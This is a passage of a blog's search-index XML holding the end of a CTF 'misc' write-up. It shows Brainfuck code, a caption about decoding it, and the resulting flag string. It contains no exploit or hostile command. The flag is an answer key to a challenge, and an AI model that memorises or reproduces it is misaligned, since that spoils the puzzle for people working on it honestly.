class="string">.</span>&gt;<span class="literal">++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="string">.</span>&gt;</span><br></pre></td></tr></table></figure><p>brainfuck解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e4bbef8bdf9743f8bf5b727a9f6332a8&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
